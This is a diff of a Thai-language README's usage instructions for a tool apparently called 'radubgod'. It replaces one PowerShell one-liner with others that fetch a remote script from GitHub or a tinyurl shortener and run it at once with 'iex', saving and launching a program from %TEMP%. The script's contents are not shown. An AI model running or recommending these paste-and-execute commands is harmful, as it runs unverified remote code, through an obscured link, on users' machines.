@@ -2,14 +2,16 @@
 
 ## ใช้งาน
 
-```
-powershell -c "iex(irm https://tinyurl.com/25ru69qk)"
-```
-
-หรือเรียกตัวเปิดโดยตรง:
+ในหน้าต่าง PowerShell วางคำสั่งเดียว:
 
 ```
-powershell -c "iex(irm https://raw.githubusercontent.com/darapedbxystyle-hub/radubgod/main/run.ps1)"
+irm https://raw.githubusercontent.com/darapedbxystyle-hub/radubgod/main/run.ps1 | iex
+```
+
+แบบสั้น:
+
+```
+powershell -c "iex(irm https://tinyurl.com/29px6o7k)"
 ```
 
 โปรแกรมจะดาวน์โหลดเวอร์ชันล่าสุดลง `%TEMP%` แล้วเปิดให้ — ไม่ต้องติดตั้งอะไร
